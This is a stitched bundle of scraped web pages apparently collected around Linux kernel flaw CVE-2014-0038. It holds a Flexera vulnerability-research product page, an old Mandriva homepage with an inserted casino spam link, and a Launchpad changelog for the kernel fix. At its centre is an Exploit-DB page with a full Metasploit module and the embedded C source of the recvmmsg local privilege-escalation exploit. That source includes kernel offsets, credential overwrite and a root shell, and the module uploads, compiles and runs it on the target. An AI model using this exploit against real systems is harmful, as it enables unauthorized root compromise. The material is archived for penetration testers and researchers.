* [Report a vulnerability](https://www.flexera.com/about-us/contact-us/report-vulnerability)

 ![Secunia Research](/sites/default/files/2022-04/hero-secunia-research-bg.jpg)

Featured Details

## Multiple ways to consume Secunia Research

Secunia delivers software security research that provides reliable, curated and actionable vulnerability intelligence. Organizations can expect to receive standardized, validated and enriched vulnerability research on a specific version of a software product. Secunia Research supports four solutions:

![Software Vulnerability Research](/sites/default/files/2022-04/icon-secunia-research-svr.svg)

### [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)

Software Vulnerability Research utilizes Secunia Research to drive awareness of vulnerabilities matching your specified criteria

[Learn More](https://www.flexera.com/products/software-vulnerability-research)

![Software Vulnerability Manager](/sites/default/files/2022-04/icon-secunia-research-svm.svg)

### [Software Vulnerability Manager](/products/software-vulnerability-manager)

Software Vulnerability Manager uses Secunia Research data to identify, prioritize and patch known vulnerable software detected in your environment

[Learn More](/products/software-vulnerability-manager)

![Data Platform](/sites/default/files/2022-04/icon-secunia-research-dp.svg)

### [Data Platform](https://www.flexera.com/products/data-platform)

Data Platform leverages Secunia Research to provide high-level insights based on major or minor versions of software in your normalized inventory

[Learn More](https://www.flexera.com/products/data-platform)

![Flexera One](/sites/default/files/2022-04/icon-secunia-research-flexera-one.svg)

### [Flexera One](/flexera-one)

Flexera One utilizes Secunia Research (alongside public NVD data) to provide more granular matching of build-level versions of software in your normalized inventory within its IT Asset Management and IT Visibility solutions

[Learn More](/flexera-one)

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Informing IT, Transforming IT

## Industry insights to help keep you informed

[#### Webinar

### Stay Ahead of Cyber Threats: Flexera's Latest Vulnerability Insights

Join us for this session where we'll explore the latest findings from the Flexera Monthly Vulnerability Insights Report.](https://info.flexera.com/SVM-WBNR-Vulnerability-Insights-Roundtable)

[#### Webinar

### Dive deeper into the Flexera Annual Vulnerability Insights

We'll explore the key findings from the Flexera Annual Vulnerability Insights Report. Learn about the latest cybersecurity trends, the most targeted industries, the types of vulnerabilities, plus management and mitigation strategies.](https://info.flexera.com/SVM-WBNR-Flexera-Annual-Vulnerability-Insights?lead_source=Website%20Visitor&id=Flexera.com-Resources)

#### Video

### Close the Risk Window with Software Vulnerability Manager

Stop reacting. Gain control. Stay secure. Build a more effective risk mitigation process leveraging Secunia Research vulnerability intelligence and the largest repository of third-party patch data in the industry.

Remote video URL

[#### Trial

### Software Vulnerability Manager Assessment free trial

Get access to the complete set of modules of Software Vulnerability Manager: Research, Assessment and Patching](https://info.flexera.com/SVM-EVAL-Software-Vulnerability-Manager)

[#### Datasheet

### Protect your ServiceNow® investment with the highest quality data

IT Visibility offers certified ServiceNow integrations that accelerate platform expansion, improve ROI and increase efficiencies across ITIL processes by delivering clean software and hardware asset data directly.](/sites/default/files/datasheet-itv-maximize-servicenow-investment.pdf)

[#### Blog

### Avoid missing crucial vulnerability intelligence amid NVD backlog

Recent developments regarding the National Vulnerability Database (NVD) have some technology leaders on edge. Since February, the U.S. National Institute of Standards and Technology (NIST) has almost completely stopped enriching software vulnerabi...](https://www.flexera.com/blog/vulnerability-management/avoid-missing-crucial-vulnerability-intelligence-amid-nvd-backlog/)

[View all resources](https://www.flexera.com/resources?category%5Bsoftware-vulnerability-management%5D=software-vulnerability-management)

## Footer Menu

* Column
  + Business challenge
    - [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
    - [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
    - [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
    - [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
    - [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
    - [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
    - [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
    - [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
    - [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
    - [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
    - [Public sector](https://www.flexera.com/solutions/public-sector)
* Column
  + Spend management by vendor
    - [IBM](https://www.flexera.com/solutions/vendor/ibm)
    - [Oracle](https://www.flexera.com/solutions/vendor/oracle)
    - [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
    - [SAP](https://www.flexera.com/solutions/vendor/sap)
    - [VMware](https://www.flexera.com/solutions/vendor/vmware)
    - [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
    - [AWS](https://www.flexera.com/solutions/vendor/aws)
    - [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
    - [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
    - [Adobe](https://www.flexera.com/solutions/vendor/adobe)
* Column
  + Products
    - [Flexera One](https://www.flexera.com/products/flexera-one)
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
    - [Security](https://www.flexera.com/products/security)
    - [Application Readiness](https://www.flexera.com/products/adminstudio)
    - [All products](https://www.flexera.com/products)
    - [All Snow products](https://www.flexera.com/products/snow)
    - [Integrations](https://www.flexera.com/products/integrations)
* Column
  + Company
    - [About](https://www.flexera.com/about-us)
    - [Careers](https://www.flexera.com/about-us/careers)
    - [Leadership](https://www.flexera.com/about-us/leadership)
    - [Contact us](https://www.flexera.com/about-us/contact-us)
    - [Media / press center](https://www.flexera.com/about-us/press-center)
    - [Revenera.com](https://www.revenera.com)

 +1.800.374.4353

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

 [![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

© 2025 Flexera. All Rights Reserved.

## Footer

* [Privacy Policy](https://www.flexera.com/legal/privacy-policy)
* [Terms and conditions](https://www.flexera.com/legal)
* [Contact Us](https://www.flexera.com/about-us/contact-us)
* [Impressum](https://www.flexera.com/about-us/impressum)
* [Site Map](https://www.flexera.com/sitemap)

#####

×

...



=== Content from www.exploit-db.com_ef26cb34_20250124_220430.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Linux Kernel 3.13.1 - 'Recvmmsg' Local Privilege Escalation (Metasploit)

#### EDB-ID:

###### 40503

#### CVE:

###### [2014-0038](https://nvd.nist.gov/vuln/detail/CVE-2014-0038)

---

**EDB Verified:**

#### Author:

###### [Metasploit](/?author=3211)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Linux](/?platform=linux)

#### Date:

###### 2016-10-11

---

**Vulnerable App:**

```
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require "msf/core"

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
        'Name'           => 'Linux Kernel 3.13.1 Recvmmsg Privilege Escalation',
        'Description'    => %q{
          This module attempts to exploit CVE-2014-0038, by sending a recvmmsg
          system call with a crafted timeout pointer parameter to gain root.
          This exploit has offsets for 3 Ubuntu 13 kernels built in:
          3.8.0-19-generic (13.04 default)
          3.11.0-12-generic (13.10 default)
          3.11.0-15-generic (13.10)
          This exploit may take up to 13 minutes to run due to a decrementing (1/sec)
          pointer which starts at 0xff*3 (765 seconds)
        },
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'h00die <mike@shorebreaksecurity.com>',  # Module
            'rebel'                         # Discovery
          ],
        'DisclosureDate' => 'Feb 2 2014',
        'Platform'       => [ 'linux'],
        'Arch'           => [ ARCH_X86, ARCH_X86_64 ],
        'SessionTypes'   => [ 'shell', 'meterpreter' ],
        'Targets'        =>
          [
            [ 'Auto', { } ]
          ],
        'DefaultTarget'  => 0,
        'DefaultOptions' => { 'WfsDelay' => 780, 'PrependFork' => true, },
        'References'     =>
          [
            [ 'EDB', '31347'],
            [ 'EDB', '31346'],
            [ 'CVE', '2014-0038'],
            [ 'URL', 'https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1453900']
          ]
      ))
    register_options(
      [
        OptString.new('WritableDir', [ true, 'A directory where we can write files (must not be mounted noexec)', '/tmp' ]),
        OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', ['Auto', 'True', 'False']])
      ], self.class)
  end

  def check
    def kernel_vuln?()
      os_id = cmd_exec('grep ^ID= /etc/os-release')
      if os_id == 'ID=ubuntu'
        kernel = Gem::Version.new(cmd_exec('/bin/uname -r'))
        case kernel.release.to_s
        when '3.11.0'
          if kernel == Gem::Version.new('3.11.0-15-generic') || kernel == Gem::Version.new('3.11.0-12-generic')
            vprint_good("Kernel #{kernel} is exploitable")
            return true
          else
            print_error("Kernel #{kernel} is NOT vulnerable or NOT exploitable")
            return false
          end
        when '3.8.0'
          if kernel == Gem::Version.new('3.8.0-19-generic')
            vprint_good("Kernel #{kernel} is exploitable")
            return true
          else
            print_error("Kernel #{kernel} is NOT vulnerable or NOT exploitable")
            return false
          end
        else
          print_error("Non-vuln kernel #{kernel}")
          return false
        end
      else
        print_error("Unknown OS: #{os_id}")
        return false
      end
    end

    if kernel_vuln?()
      return CheckCode::Appears
    else
      return CheckCode::Safe
    end
  end

  def exploit

    if check != CheckCode::Appears
      fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')
    end

    # direct copy of code from exploit-db.  I removed a lot of the comments in the title area just to cut down on size

    recvmmsg = %q{
      /*
      *=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
      recvmmsg.c - linux 3.4+ local root (CONFIG_X86_X32=y)
      CVE-2014-0038 / x32 ABI with recvmmsg
      by rebel @ irc.smashthestack.org
      -----------------------------------
      */

      #define _GNU_SOURCE
      #include <netinet/ip.h>
      #include <stdio.h>
      #include <stdlib.h>
      #include <string.h>
      #include <sys/socket.h>
      #include <unistd.h>
      #include <sys/syscall.h>
      #include <sys/mman.h>
      #include <sys/types.h>
      #include <sys/stat.h>
      #include <fcntl.h>
      #include <sys/utsname.h>

      #define __X32_SYSCALL_BIT 0x40000000
      #undef __NR_recvmmsg
      #define __NR_recvmmsg (__X32_SYSCALL_BIT + 537)
      #define VLEN 1
      #define BUFSIZE 200

      int port;

      struct offset {
          char *kernel_version;
          unsigned long dest; // net_sysctl_root + 96
          unsigned long original_value; // net_ctl_permissions
          unsigned long prepare_kernel_cred;
          unsigned long commit_creds;
      };

      struct offset offsets[] = {
          {"3.11.0-15-generic",0xffffffff81cdf400+96,0xffffffff816d4ff0,0xffffffff8108afb0,0xffffffff8108ace0}, // Ubuntu 13.10
          {"3.11.0-12-generic",0xffffffff81cdf3a0,0xffffffff816d32a0,0xffffffff8108b010,0xffffffff8108ad40}, // Ubuntu 13.10
          {"3.8.0-19-generic",0xffffffff81cc7940,0xffffffff816a7f40,0xffffffff810847c0, 0xffffffff81084500}, // Ubuntu 13.04
          {NULL,0,0,0,0}
      };

      void udp(int b) {
          int sockfd;
          struct sockaddr_in servaddr,cliaddr;
          int s = 0xff+1;

          if(fork() == 0) {
              while(s > 0) {
                  fprintf(stderr,"\rbyte %d / 3.. ~%d secs left    \b\b\b\b",b+1,3*0xff - b*0xff - (0xff+1-s));
                  sleep(1);
                  s--;
                  fprintf(stderr,".");
              }

              sockfd = socket(AF_INET,SOCK_DGRAM,0);
              bzero(&servaddr,sizeof(servaddr));
              servaddr.sin_family = AF_INET;
              servaddr.sin_addr.s_addr=htonl(INADDR_LOOPBACK);
              servaddr.sin_port=htons(port);
              sendto(sockfd,"1",1,0,(struct sockaddr *)&servaddr,sizeof(servaddr));
              exit(0);
          }

      }

      void trigger() {
          open("/proc/sys/net/core/somaxconn",O_RDONLY);

          if(getuid() != 0) {
              fprintf(stderr,"not root, ya blew it!\n");
              exit(-1);
          }

          fprintf(stderr,"w00p w00p!\n");
          system("/bin/sh -i");
      }

      typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
      typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
      _commit_creds commit_creds;
      _prepare_kernel_cred prepare_kernel_cred;

      // thx bliss
      static int __attribute__((regparm(3)))
      getroot(void *head, void * table)
      {
          commit_creds(prepare_kernel_cred(0));
          return -1;
      }

      void __attribute__((regparm(3)))
      trampoline()
      {
          asm("mov $getroot, %rax; call *%rax;");
      }

      int main(void)
      {
          int sockfd, retval, i;
          struct sockaddr_in sa;
          struct mmsghdr msgs[VLEN];
          struct iovec iovecs[VLEN];
          char buf[BUFSIZE];
          long mmapped;
          struct utsname u;
          struct offset *off = NULL;

          uname(&u);

          for(i=0;offsets[i].kernel_version != NULL;i++) {
              if(!strcmp(offsets[i].kernel_version,u.release)) {
                  off = &offsets[i];
                  break;
              }
          }

          if(!off) {
              fprintf(stderr,"no offsets for this kernel version..\n");
              exit(-1);
          }

          mmapped = (off->original_value  & ~(sysconf(_SC_PAGE_SIZE) - 1));
          mmapped &= 0x000000ffffffffff;

              srand(time(NULL));
          port = (rand() % 30000)+1500;

          commit_creds = (_commit_creds)off->commit_creds;
          prepare_kernel_cred = (_prepare_kernel_cred)off->prepare_kernel_cred;

          mmapped = (long)mmap((void *)mmapped, sysconf(_SC_PAGE_SIZE)*3, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);

          if(mmapped == -1) {
              perror("mmap()");
              exit(-1);
          }

          memset((char *)mmapped,0x90,sysconf(_SC_PAGE_SIZE)*3);

          memcpy((char *)mmapped + sysconf(_SC_PAGE_SIZE), (char *)&trampoline, 300);

          if(mprotect((void *)mmapped, sysconf(_SC_PAGE_SIZE)*3, PROT_READ|PROT_EXEC) != 0) {
              perror("mprotect()");
              exit(-1);
          }

          sockfd = socket(AF_INET, SOCK_DGRAM, 0);
          if (sockfd == -1) {
              perror("socket()");
              exit(-1);
          }

          sa.sin_family = AF_INET;
          sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
          sa.sin_port = htons(port);

          if (bind(sockfd, (struct sockaddr *) &sa, sizeof(sa)) == -1) {
              perror("bind()");
              exit(-1);
          }

          memset(msgs, 0, sizeof(msgs));

          iovecs[0].iov_base = &buf;
          iovecs[0].iov_len = BUFSIZE;
          msgs[0].msg_hdr.msg_iov = &iovecs[0];
          msgs[0].msg_hdr.msg_iovlen = 1;

          for(i=0;i < 3 ;i++) {
              udp(i);
              retval = syscall(__NR_recvmmsg, sockfd, msgs, VLEN, 0, (void *)off->dest+7-i);
              if(!retval) {
                  fprintf(stderr,"\nrecvmmsg() failed\n");
              }
          }

          close(sockfd);
          fprintf(stderr,"\n");
          trigger();
      }
    }

    filename = rand_text_alphanumeric(8)
    executable_path = "#{datastore['WritableDir']}/#{filename}"
    payloadname = rand_text_alphanumeric(8)
    payload_path = "#{datastore['WritableDir']}/#{payloadname}"

    def has_prereqs?()
      gcc = cmd_exec('which gcc')
      if gcc.include?('gcc')
        vprint_good('gcc is installed')
      else
        print_error('gcc is not installed.  Compiling will fail.')
      end
      return gcc.include?('gcc')
    end

    compile = false
    if datastore['COMPILE'] == 'Auto' || datastore['COMPILE'] == 'True'
      if has_prereqs?()
        compile = true
        vprint_status('Live compiling exploit on system')
      else
        vprint_status('Dropping pre-compiled exploit on system')
      end
    end
    if check != CheckCode::Appears
      fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')
    end

    def upload_and_chmod(fname,fcontent)
      print_status "Writing to #{fname} (#{fcontent.size} bytes)"
      rm_f fname
      write_file(fname, fcontent)
      cmd_exec("chmod +x #{fname}")
      register_file_for_cleanup(fname)
    end

    if compile
      recvmmsg.gsub!(/system\("\/bin\/sh -i"\);/,
                          "system(\"#{payload_path}\");")
      upload_and_chmod("#{executable_path}.c", recvmmsg)
      vprint_status("Compiling #{executable_path}.c")
      cmd_exec("gcc -o #{executable_path} #{executable_path}.c") #compile
      register_file_for_cleanup(executable_path)
    else
      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2014-0038', 'recvmmsg')
      fd = ::File.open( path, "rb")
      recvmmsg = fd.read(fd.stat.size)
      fd.close
      upload_and_chmod(executable_path, recvmmsg)
      # overwrite with the hardcoded variable names in the compiled versions
      payload_filename = 'a0RwAacU'
      payload_path = "/tmp/#{payload_filename}"
    end

    upload_and_chmod(payload_path, generate_payload_exe)
    stime = Time.now
    vprint_status("Exploiting... May take 13min.  Start time: #{stime}")
    output = cmd_exec(executable_path)
    output.each_line { |line| vprint_status(line.chomp) }
  end
end

```

**Tags:**
[Metasploit Framework (MSF)](/?tag=3)

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from www.mandriva.com_16f2d88f_20250124_220344.html ===


* [Tuxedo.org](https://tuxedo.org/ "Go to: Tuxedo")
* Store
* Mandriva Linux
* Enterprise Solutions
* Contact Us
* Language ![](/sites/all/themes/mandriva_customer/images/arrow-grey-bottom.gif)
  + English (International)
  + Français
  + Ð ÑÑÑÐºÐ¸Ð¹

# [Mandriva](/mandriva/)

* Download
* Mandriva Linux
* Community
* Help

## One

### The Linux desktopthat's easy to try and easy to keep

Download
![Mandriva One](/sites/all/themes/mandriva_customer/images/front/packshot_Mandriva_One.png)

## Powerpack

### Mandriva Linux- and more

Download
![Mandriva Linux Powerpack](/sites/all/themes/mandriva_customer/images/front/en-49.png)

## Mandriva Flash

### The mobile and installable Linux desktopon a USB key

Buy on Store
![Mandriva Flash](/sites/all/themes/mandriva_customer/images/front/mandriva-flash2.png)

### [Community](community)

* User Forums
* Support - FAQ
* Free Software
* Become a member

### Enterprise Solutions

* Enterprise Linux Products
* Asset Management Solution
* Professional Services
* Support & Maintenance

* Go to site »

### Mandriva Partners

* Worldwide offices
* Partner Program
* Technology Partners
* OEM
* Classmate PC with Mandriva Linux

### News

* Mandriva presents the launch of its new mobile desktop: Mandriva Flash 2008 Spring
* Speaking about Mandriva Linux 2008 Spring in media
* Speaking about Mandriva Linux 2008 Spring in media
* Mandriva presents its latest distribution: Mandriva Linux 2008 Spring
* Mandriva and Novatice Technologies present Edutice, The ready to use solution dedicated to educationand multimedia spaces
* # [Top 50 Online Casinos UK in 2023](https://montycasinos.com/online-casinos/)

more

* Download
  + Mandriva Linux 2008
  + Writing an ISO image
* Mandriva Linux
  + One
  + Powerpack
  + Mandriva Flash
* Community
  + Start
  + Register
  + Stay informed
  + Participate
  + Free software
* Help
  + Getting help
  + Knowledge Base
  + Documentation
  + Forums
  + Support Requests
  + Customer Care
  + Enterprise Support
* Enterprise Solutions
  + Products
  + Support
  + Services
  + Partners
  + Go to site »

Language
English (International)
Français
Ð ÑÑÑÐºÐ¸Ð¹

* © 2007 Mandriva S.A.
* About Us
* Legal Information
* Privacy Policy
* Contact Us



=== Content from launchpad.net_c8369672_20250126_034945.html ===

[Log in / Register](https://launchpad.net/ubuntu/%2Bsource/linux-lts-raring/3.8.0-35.52~precise1/%2Blogin)

[![](https://launchpadlibrarian.net/606381979/CoF%2064px.png)](https://launchpad.net/ubuntu)

## [Ubuntu](https://launchpad.net/ubuntu)[linux-lts-raring package](https://launchpad.net/ubuntu/%2Bsource/linux-lts-raring)

* [Overview](https://launchpad.net/ubuntu/%2Bsource/linux-lts-raring)
* [Code](https://code.launchpad.net/ubuntu/%2Bsource/linux-lts-raring)
* [Bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/linux-lts-raring)
* Blueprints
* [Translations](https://translations.launchpad.net/ubuntu/%2Bsource/linux-lts-raring)
* [Answers](https://answers.launchpad.net/ubuntu/%2Bsource/linux-lts-raring)

# linux-lts-raring 3.8.0-35.52~precise1 source package in Ubuntu

## Changelog

```
linux-lts-raring (3.8.0-35.52~precise1) precise; urgency=low

  [ John Johansen ]

  * SAUCE: Fix compat_sys_recvmsg on x32 archs
    - LP: [#1274349](/bugs/1274349)
 -- Brad Figg <email address hidden>   Thu, 30 Jan 2014 08:39:03 -0800
```

## Upload details

Uploaded by:
[Brad Figg](/~brad-figg)
on 2014-01-30

Sponsored by:
[Adam Conrad](/~adconrad)

Uploaded to:
[Precise](/ubuntu/precise)

Original maintainer:
